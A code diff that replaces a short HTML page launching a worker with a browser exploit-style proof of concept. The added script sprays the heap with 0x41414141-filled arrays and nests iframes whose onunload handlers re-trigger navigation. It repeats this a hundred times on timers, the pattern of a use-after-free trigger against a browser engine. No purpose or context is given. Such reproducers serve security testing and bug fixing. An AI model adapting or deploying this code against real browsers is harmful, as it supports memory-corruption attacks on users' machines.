@@ -1,5 +1,35 @@
-<html> 
-    <script>
-        w = new Worker('idbworker.js');
-    </script>
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+let spray = [];
+function sprayHeap() {
+    for (let i = 0; i < 1000; i++) {
+        let arr = new Array(0x100).fill(0x41414141);
+        spray.push(arr);
+    }
+}
+
+function trigger() {
+    let f = document.body.appendChild(document.createElement('iframe'));
+    let g = f.contentDocument.body.appendChild(document.createElement('iframe'));
+    g.contentWindow.onunload = () => {
+        g.contentWindow.onunload = null;
+        sprayHeap();
+        let h = f.contentDocument.body.appendChild(document.createElement('iframe'));
+        h.contentWindow.onunload = () => {
+            h.contentWindow.onunload = null;
+            let a = f.contentDocument.createElement('a');
+            a.href = 'about:blank';
+            a.click();
+        };
+    };
+    f.src = 'about:blank';
+}
+
+for (let i = 0; i < 100; i++) {
+    setTimeout(trigger, i * 100);
+}
+</script>
+</body>
 </html>
